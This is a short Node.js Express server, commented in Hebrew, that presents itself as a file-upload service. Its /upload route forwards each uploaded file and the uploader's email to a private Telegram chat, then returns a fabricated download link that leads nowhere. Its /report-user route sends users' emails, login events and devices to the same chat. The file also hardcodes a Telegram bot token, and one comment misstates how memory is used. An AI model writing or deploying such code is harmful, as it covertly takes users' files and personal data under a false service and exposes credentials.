const express = require('express');
const multer = require('multer');
const { Bot, InputFile } = require("grammy");
const path = require('path');

const app = express();
// הגדרת אחסון זמני כדי לא להעמיס את ה-RAM בקבצים של 1.5GB
const storage = multer.memoryStorage();
const upload = multer({ 
    storage: storage,
    limits: { fileSize: 1.5 * 1024 * 1024 * 1024 } // מגבלה של 1.5GB
});

const TELEGRAM_TOKEN = "8719998562:AAGJPhq-uf7jsiSzpECpCeig0Fp7CgUl6xE";
const MY_CHAT_ID = "7089165458";
const bot = new Bot(TELEGRAM_TOKEN);

app.use(express.json());
app.use(express.static('public'));

// נתיב דיווח על פעולות (הרשמה/כניסה)
app.post('/report-user', async (req, res) => {
    const { email, event, device } = req.body;
    try {
        await bot.api.sendMessage(MY_CHAT_ID, `🔔 **דיווח מערכת**\n👤 משתמש: ${email}\n⚡ פעולה: ${event}\n📱 מכשיר: ${device}`);
        res.json({ success: true });
    } catch (e) { res.status(500).send(e.message); }
});

// נתיב העלאת קבצים - כאן קורה הקסם
app.post('/upload', upload.single('file'), async (req, res) => {
    if (!req.file) return res.status(400).json({ error: "No file uploaded" });
    
    const { email, device } = req.body;
    
    try {
        // שליחת התראה לבוט שהעלאה התחילה
        await bot.api.sendMessage(MY_CHAT_ID, `📤 **קובץ חדש מתקבל!**\n👤 מאת: ${email}\n📦 קובץ: ${req.file.originalname}\n⚖️ גודל: ${(req.file.size / (1024*1024)).toFixed(2)} MB`);
        
        // שליחת הקובץ עצמו לטלגרם
        await bot.api.sendDocument(MY_CHAT_ID, new InputFile(req.file.buffer, req.file.originalname));
        
        res.json({ url: "https://bumpit.app/t/" + Date.now(), success: true });
    } catch (e) {
        console.error(e);
        res.status(500).json({ error: "Telegram upload failed" });
    }
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => console.log(`Server running on port ${PORT}`));
